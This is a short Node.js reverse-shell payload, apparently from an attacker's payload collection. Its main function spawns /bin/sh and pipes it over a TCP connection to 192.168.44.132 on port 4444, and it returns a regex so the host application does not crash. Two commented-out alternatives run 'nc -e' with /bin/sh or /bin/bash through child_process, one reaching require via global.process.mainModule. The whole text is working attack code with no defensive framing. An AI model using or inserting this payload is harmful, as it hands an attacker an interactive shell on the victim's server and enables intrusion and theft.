(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.44.132", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();


// or

// require('child_process').exec('nc -e /bin/sh 192.168.44.132 4444')

// or

// var x = global.process.mainModule.require
// x('child_process').exec('nc 192.168.44.132 4444 -e /bin/bash')
